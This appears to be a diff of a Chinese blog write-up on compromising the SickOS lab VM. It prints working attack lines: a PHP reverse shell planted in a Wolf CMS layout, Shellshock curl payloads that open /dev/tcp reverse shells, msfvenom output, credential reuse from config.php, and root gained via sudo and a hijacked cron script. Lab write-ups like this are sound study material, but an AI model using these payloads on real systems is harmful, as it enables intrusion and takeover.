@@ -5,12 +5,12 @@ categories: 靶机系列
 
 # 红队笔记靶机--SickOS
 
-### 1.主机发现和信息收�?
+### 1.主机发现和信息收集
 
 ```shell
 
-╭─ /home/kali/Desktop  with root@kali at 23:50:08 ─�?
-╰─�?nmap -sn 192.168.8.0/24                                                                                                              
+╭─ /home/kali/Desktop  with root@kali at 23:50:08 ─╮
+╰─❯ nmap -sn 192.168.8.0/24                                                                                                              
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-22 23:50 EDT
 Nmap scan report for 192.168.8.1 (192.168.8.1)
 Host is up (0.0044s latency).
@@ -45,11 +45,11 @@ Nmap done: 256 IP addresses (10 hosts up) scanned in 2.06 seconds
 
 ```
 
-由于靶机是Oracle VirtualBox 搭建，所以我们快速定�?ip为：192.168.8.103, 接下来对ip进行扫描�?
+由于靶机是Oracle VirtualBox 搭建，所以我们快速定位 ip为：192.168.8.103, 接下来对ip进行扫描：
 
 ```shell
-╭─ /home/kali/Desktop  INT with root@kali at 23:54:17 ─�?
-╰─�?nmap -sT -p- --min-rate 10000 192.168.8.103                                                                                                                   
+╭─ /home/kali/Desktop  INT with root@kali at 23:54:17 ─╮
+╰─❯ nmap -sT -p- --min-rate 10000 192.168.8.103                                                                                                                   
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-22 23:54 EDT
 Nmap scan report for 192.168.8.103 (192.168.8.103)
 Host is up (0.0020s latency).
@@ -67,8 +67,8 @@ Nmap done: 1 IP address (1 host up) scanned in 13.42 seconds
 下面对进行深度扫描：
 
 ```shell
-╭─ /home/kali/Desktop  took 13s with root@kali at 23:54:33 ─�?
-╰─�?nmap -sT -p22,3128,8080 -sV -O -sC --min-rate 10000 192.168.8.103                                                                                                                       ─�?
+╭─ /home/kali/Desktop  took 13s with root@kali at 23:54:33 ─╮
+╰─❯ nmap -sT -p22,3128,8080 -sV -O -sC --min-rate 10000 192.168.8.103                                                                                                                       ─╯
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-22 23:58 EDT
 Nmap scan report for 192.168.8.103 (192.168.8.103)
 Host is up (0.0072s latency).
@@ -98,7 +98,7 @@ Nmap done: 1 IP address (1 host up) scanned in 35.93 seconds
 
 ```shell
 ╭─ /home/kali/Desktop  wi
-╰─�?nmap -sU 192.168.8.103                                                                                                                                         
+╰─❯ nmap -sU 192.168.8.103                                                                                                                                         
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-23 00:05 EDT
 Nmap scan report for 192.168.8.103 (192.168.8.103)
 Host is up (0.016s latency).
@@ -108,8 +108,8 @@ MAC Address: 08:00:27:FE:CE:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
 Nmap done: 1 IP address (1 host up) scanned in 21.45 seconds
 
-╭─ /home/kali/Desktop took 22s with root@kali at 00:05:59 ─�?
-╰─�?nmap -sU -p 0-1000 192.168.8.103                                                                                                                            
+╭─ /home/kali/Desktop took 22s with root@kali at 00:05:59 ─╮
+╰─❯ nmap -sU -p 0-1000 192.168.8.103                                                                                                                            
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-23 00:06 EDT
 Nmap scan report for 192.168.8.103 (192.168.8.103)
 Host is up (0.0024s latency).
@@ -126,8 +126,8 @@ Nmap done: 1 IP address (1 host up) scanned in 21.48 seconds
 接下来进行最后一步，使用script脚本对其进行漏洞扫描
 
 ```shell
-╭─ /home/kali/Desktop  took 22s with root@kali at 00:06:48 ─�?
-╰─�?nmap 192.168.8.103  --script=vuln                                                                                                     
+╭─ /home/kali/Desktop  took 22s with root@kali at 00:06:48 ─╮
+╰─❯ nmap 192.168.8.103  --script=vuln                                                                                                     
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-23 00:09 EDT
 Pre-scan script results:
 | broadcast-avahi-dos: 
@@ -148,23 +148,23 @@ Nmap done: 1 IP address (1 host up) scanned in 40.59 seconds
 
 ```
 
-至此，信息收集阶段已经结�?
+至此，信息收集阶段已经结束
 
-### 2.渗透测�?
+### 2.渗透测试
 
-经过信息收集结果，我们知道开放了22�?128端口，且为Linux服务器，22端口不优先尝试，一般只有拿到账号密码的时候才测试22端口，�?128端口为代理服务，我们可以通过代理来访问本不应该被外部访问的服务，squid支持的协议有http,ftp,gopher 无法代理ssh等其他服�?
+经过信息收集结果，我们知道开放了22和3128端口，且为Linux服务器，22端口不优先尝试，一般只有拿到账号密码的时候才测试22端口，而3128端口为代理服务，我们可以通过代理来访问本不应该被外部访问的服务，squid支持的协议有http,ftp,gopher 无法代理ssh等其他服务 
 
-打开3128我们发现是一个报错界�?
+打开3128我们发现是一个报错界面
 
-{% asset_img image-20260623123941252.png image-20260623123941252 %}
+{% asset_img G:\靶机笔记\红队笔记靶机--SickOS\image-20260623123941252.png image-20260623123941252 %}
 
-[报错]: 尝试取回网址时遇到以下错�?/(http://192.168.8.103:3128/)**无效的网址**请求�?URL 的某些方面不正确。一些可能的问题�?缺失或错误的访问协议(应为 http://http:// 或类�?缺少主机名非法双重逃脱不允许以主机名为非法字符;下划线。webmaster(mailto:
+[报错]: 尝试取回网址时遇到以下错误:/(http://192.168.8.103:3128/)**无效的网址**请求的 URL 的某些方面不正确。一些可能的问题是:缺失或错误的访问协议(应为 http://http:// 或类似)缺少主机名非法双重逃脱不允许以主机名为非法字符;下划线。webmaster(mailto:
 
-虽说可以通过代理访问服务，但是我们还是要�?128进行目录扫描，以防遗漏关键信�?
+虽说可以通过代理访问服务，但是我们还是要对3128进行目录扫描，以防遗漏关键信息
 
 ```shell
-╭─ /home/kali/Desktop  х INT with root@kali at 21:55:22 ─�?
-╰─�?dirsearch -u "http://192.168.8.103:3128/"                                                                                                                                                                    
+╭─ /home/kali/Desktop  х INT with root@kali at 21:55:22 ─╮
+╰─❯ dirsearch -u "http://192.168.8.103:3128/"                                                                                                                                                                    
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
 from pkg_resources import DistributionNotFound, VersionConflict
 
@@ -304,11 +304,11 @@ Task Completed
 
 ```
 
-并没有有效信�? 接下来尝试添�?p 参数 使用http://192.168.8.103:3128 作为代理 
+并没有有效信息  接下来尝试添加-p 参数 使用http://192.168.8.103:3128 作为代理 
 
 ```shell
-╭─ /home/kali/Desktop  with root@kali at 22:11:48 ─�?
-╰─�?dirb  "http://192.168.8.103" -p "http://192.168.8.103:3128"
+╭─ /home/kali/Desktop  with root@kali at 22:11:48 ─╮
+╰─❯ dirb  "http://192.168.8.103" -p "http://192.168.8.103:3128"
 -----------------
 DIRB v2.22    
 By The Dark Raver
@@ -338,11 +338,11 @@ DOWNLOADED: 4612 - FOUND: 8
 
 ```
 
-我们打开首页 发现出现了一个巨大的BLEHHHH!的字�?
+我们打开首页 发现出现了一个巨大的BLEHHHH!的字样 
 
-{% asset_img image-20260627102440501.png image-20260627102440501 %}
+{% asset_img G:\靶机笔记\红队笔记靶机--SickOS\image-20260627102440501.png image-20260627102440501 %}
 
-查询这个单词的意思：是一个口语或者表示郁�?在渗透测试过程中，可能为某些系统默认页特征，接下来查看robots/robots.txt的内容：
+查询这个单词的意思：是一个口语或者表示郁闷 在渗透测试过程中，可能为某些系统默认页特征，接下来查看robots/robots.txt的内容：
 
 ```
 User-agent: *
@@ -360,11 +360,11 @@ Dissalow: /wolfcms
 
 这里，我们得到了一个很重要的信息：
 
-网站使用wolfcms 搭建，接下来对该站点进行扫描�?
+网站使用wolfcms 搭建，接下来对该站点进行扫描：
 
 ```shell
-╭─ /home/kali/Desktop · took 29s with root@kali at 22:12:19 ─�?
-╰─�?dirb  "http://192.168.8.103/wolfcms" -p "http://192.168.8.103:3128/"                                                                                                                      
+╭─ /home/kali/Desktop · took 29s with root@kali at 22:12:19 ─╮
+╰─❯ dirb  "http://192.168.8.103/wolfcms" -p "http://192.168.8.103:3128/"                                                                                                                      
 
 -----------------
 DIRB v2.22    
@@ -407,27 +407,27 @@ DOWNLOADED: 4612 - FOUND: 7
 
 先查看index.php页面
 
-{% asset_img image-20260627103745950.png image-20260627103745950 %}
+{% asset_img G:\靶机笔记\红队笔记靶机--SickOS\image-20260627103745950.png image-20260627103745950 %}
 
-其中Posted by Administrator on Sat, 5 Dec 2015 我们可以得知 文章是以管理员用户或者管理员用户组身份发布的 接下来我们需要知道后台登陆页面的路径，由于目录扫描未扫出路径，这里我们去网上搜素�?
+其中Posted by Administrator on Sat, 5 Dec 2015 我们可以得知 文章是以管理员用户或者管理员用户组身份发布的 接下来我们需要知道后台登陆页面的路径，由于目录扫描未扫出路径，这里我们去网上搜素：
 
-{% asset_img image-20260627105006799.png image-20260627105006799 %}
+{% asset_img G:\靶机笔记\红队笔记靶机--SickOS\image-20260627105006799.png image-20260627105006799 %}
 
-{% asset_img image-20260627105053318.png image-20260627105053318 %}
+{% asset_img G:\靶机笔记\红队笔记靶机--SickOS\image-20260627105053318.png image-20260627105053318 %}
 
-尝试弱密码：admin/admin 成功登入�?
+尝试弱密码：admin/admin 成功登入！
 
-后台�?
+后台：
 
-{% asset_img image-20260627111051915.png image-20260627111051915 %}
+{% asset_img G:\靶机笔记\红队笔记靶机--SickOS\image-20260627111051915.png image-20260627111051915 %}
 
 我们找到这个功能，向Upload file这里传入文件，或者点开Pages/layouts  嵌入webshell
 
-我们使用第二�?，向主题网页中嵌入反向shell脚本，这样在目标中会更加隐蔽�?
+我们使用第二点 ，向主题网页中嵌入反向shell脚本，这样在目标中会更加隐蔽：
 
-{% asset_img image-20260627114603634.png image-20260627114603634 %}
+{% asset_img G:\靶机笔记\红队笔记靶机--SickOS\image-20260627114603634.png image-20260627114603634 %}
 
-添加php代码�?
+添加php代码：
 
 ```php
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.8.114/443 0>&1'");?>
@@ -435,13 +435,13 @@ DOWNLOADED: 4612 - FOUND: 7
 
 使用443是因为担心服务器对客户端的端口有限制 443通常为https服务，这样有很大概率能成功将shell反弹
 
-本地监听443�?
+本地监听443：
 
 打开wolfcms首页 触发更改样式主页的恶意php脚本
 
 ```shell
-╭─ /home/kali/Desktop ··············· took 6m 23s with root@kali at 23:36:50 ─�?
-╰─�?nc -lvp 443                                                              ─�?
+╭─ /home/kali/Desktop ··············· took 6m 23s with root@kali at 23:36:50 ─╮
+╰─❯ nc -lvp 443                                                              ─╯
 listening on [any] 443 ...
 connect to [192.168.8.114] from 192.168.8.103 [192.168.8.103] 36737
 bash: no job control in this shell
@@ -455,11 +455,11 @@ bash-4.2$
 
 ### 3.解法1:垂直越权sickos账户+垂直越权root
 
-查看当前目录下有哪些文件�?
+查看当前目录下有哪些文件：
 
 ```shell
-╭─ /home/kali/Desktop ··············· took 8m 52s with root@kali at 23:55:31 ─�?
-╰─�?nc -lvp 443                                                              ─�?
+╭─ /home/kali/Desktop ··············· took 8m 52s with root@kali at 23:55:31 ─╮
+╰─❯ nc -lvp 443                                                              ─╯
 listening on [any] 443 ...
 connect to [192.168.8.114] from 192.168.8.103 [192.168.8.103] 36777
 bash: no job control in this shell
@@ -478,7 +478,7 @@ wolf
 bash-4.2$ 
 ```
 
-查看用户�?
+查看用户：
 
 ```shell
 cat /etc/passwd
@@ -511,7 +511,7 @@ mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
 bash-4.2$ 
 ```
 
-得到账户：sickos  敏感文件config.php 在渗透测试过程中，config.php会包含网�?数据库配置的用户密码，可以利用这点进行撞库攻�?查看config.php
+得到账户：sickos  敏感文件config.php 在渗透测试过程中，config.php会包含网站/数据库配置的用户密码，可以利用这点进行撞库攻击,查看config.php
 
 ```php
 <?php 
@@ -641,7 +641,7 @@ Last login: Tue Sep 22 08:32:44 2015
 
 ```
 
-sudo -l查看开放了哪些权限�?
+sudo -l查看开放了哪些权限：
 
 ```shell
 -bash-4.2$ sudo -l
@@ -654,14 +654,14 @@ User sickos may run the following commands on this host:
 
 ```
 
-sudo 开放了全部权限 下面使用sudo ls /root 查看root目录下的文件�?
+sudo 开放了全部权限 下面使用sudo ls /root 查看root目录下的文件：
 
 ```
 -bash-4.2$ sudo ls /root
 a0216ea4d51874464078c618298b1367.txt
 ```
 
-查看�?sudo cat /root/a0216ea4d51874464078c618298b1367.txt
+查看： sudo cat /root/a0216ea4d51874464078c618298b1367.txt
 
 ```
 -bash-4.2$ sudo cat /root/a0216ea4d51874464078c618298b1367.txt
@@ -679,7 +679,7 @@ Thanks for Trying
 
 ### 3.1解法2 www-data->root  定时脚本反弹shell 
 
-在此之前，先要升级到交互式shell , 查看定时计划�?
+在此之前，先要升级到交互式shell , 查看定时计划：
 
 ```
 www-data@SickOs:/etc$ echo 1
@@ -697,7 +697,7 @@ www-data@SickOs:/etc/cron.d$ cat automate
           www-data@SickOs:/etc/cron.d$ 
 ```
 
-root身份执行  /var/www/connect.py 接下来覆�?/var/www/connect.py 反弹shell
+root身份执行  /var/www/connect.py 接下来覆写 /var/www/connect.py 反弹shell
 
 ```shell
 ┌──(kali㉿kali)-[~]
@@ -726,8 +726,8 @@ Thanks for Trying
 我们在目录扫描的过程中发现了/cgi-bin/bin ,  这时我们需要用到nikto 去扫描一下：
 
 + ```shell
-  ╭─ /home/kali ······························································································································································· х INT with root@kali at 21:04:49 ─�?
-  ╰─�?nikto -h 192.168.8.103 -useproxy http://192.168.8.103:3128                                                                                                                                                 
+  ╭─ /home/kali ······························································································································································· х INT with root@kali at 21:04:49 ─╮
+  ╰─❯ nikto -h 192.168.8.103 -useproxy http://192.168.8.103:3128                                                                                                                                                 
   
   - Nikto v2.5.0
   
@@ -759,21 +759,21 @@ Thanks for Trying
 
   发现存在CVE-2014-6271 
 
-{% asset_img image-20260628091603757.png image-20260628091603757 %}
+{% asset_img G:\靶机笔记\红队笔记靶机--SickOS\image-20260628091603757.png image-20260628091603757 %}
 
-简单来说就�?Shell在处理环境变量时，错误地将函数定义后面的字符串也当作命令来执行了
+简单来说就是 Shell在处理环境变量时，错误地将函数定义后面的字符串也当作命令来执行了
 
 ```bash
 env x='() { :;}; echo vulnerable' bash -c "echo test"
 ```
 
-上面的POC�?创建一个临时的环境变量�?) { :;}; 是空函数的写法，bash 会解析函数之外的内容 即echo vulnerable' bash -c "echo test"
+上面的POC： 创建一个临时的环境变量，() { :;}; 是空函数的写法，bash 会解析函数之外的内容 即echo vulnerable' bash -c "echo test"
 
-下面针对Linux给出的路径，使用curl进行进行手动验证，在实战中也推荐使用手动或者单独的漏洞脚本，否则会暴露出特�?
+下面针对Linux给出的路径，使用curl进行进行手动验证，在实战中也推荐使用手动或者单独的漏洞脚本，否则会暴露出特征
 
 ```shell
-╭─ /home/kali ····································································································································································· with root@kali at 21:33:07 ─�?
-╰─�?curl -H "User-Agent: () { :; }; echo; /bin/ls -la /" http://192.168.8.103/cgi-bin/status --proxy http://192.168.8.103:3128                                                                                 ─�?
+╭─ /home/kali ····································································································································································· with root@kali at 21:33:07 ─╮
+╰─❯ curl -H "User-Agent: () { :; }; echo; /bin/ls -la /" http://192.168.8.103/cgi-bin/status --proxy http://192.168.8.103:3128                                                                                 ─╯
 total 84
 drwxr-xr-x  22 root root  4096 Sep 22  2015 .
 drwxr-xr-x  22 root root  4096 Sep 22  2015 ..
@@ -804,14 +804,14 @@ lrwxrwxrwx   1 root root    30 Sep 22  2015 vmlinuz -> boot/vmlinuz-3.11.0-15-ge
 使用msfvenom 生成反向shell 
 
 ```shell
-╭─ /home/kali ····································································································································································· with root@kali at 21:41:12 ─�?
-╰─�?msfvenom -p cmd/unix/reverse_bash lhost=192.168.8.114 lport = 443 -f raw                                                                                                                                   ─�?
+╭─ /home/kali ····································································································································································· with root@kali at 21:41:12 ─╮
+╰─❯ msfvenom -p cmd/unix/reverse_bash lhost=192.168.8.114 lport = 443 -f raw                                                                                                                                   ─╯
 [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
 [-] No arch selected, selecting arch: cmd from the payload
 Error: One or more options failed to validate: LPORT.
 
-╭─ /home/kali ····························································································································································· took 4s with root@kali at 21:41:59 ─�?
-╰─�?msfvenom -p cmd/unix/reverse_bash lhost=192.168.8.114 lport=443 -f raw                                                                                                                                     ─�?
+╭─ /home/kali ····························································································································································· took 4s with root@kali at 21:41:59 ─╮
+╰─❯ msfvenom -p cmd/unix/reverse_bash lhost=192.168.8.114 lport=443 -f raw                                                                                                                                     ─╯
 [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
 [-] No arch selected, selecting arch: cmd from the payload
 No encoder specified, outputting raw payload
@@ -822,11 +822,11 @@ bash -c '0<&154-;exec 154<>/dev/tcp/192.168.8.114/443;sh <&154 >&154 2>&154'
 这里有一点要注意 sh 要替换为/bin/bash
 
 ```shell
-╭─ /home/kali ······································ х INT with root@kali at 21:43:03 ─�?
-╰─�?curl -H "User-Agent: () { :; }; echo; 0<&154-;exec 154<>/dev/tcp/192.168.8.114/443;/bin/bash <&154 >&154 2>&154 " http://192.168.8.103/cgi-bin/status --proxy http://192.168.8.103:3128
+╭─ /home/kali ······································ х INT with root@kali at 21:43:03 ─╮
+╰─❯ curl -H "User-Agent: () { :; }; echo; 0<&154-;exec 154<>/dev/tcp/192.168.8.114/443;/bin/bash <&154 >&154 2>&154 " http://192.168.8.103/cgi-bin/status --proxy http://192.168.8.103:3128
 ```
 
-成功反弹�?
+成功反弹：
 
 ```shell
 ┌──(kali㉿kali)-[~]
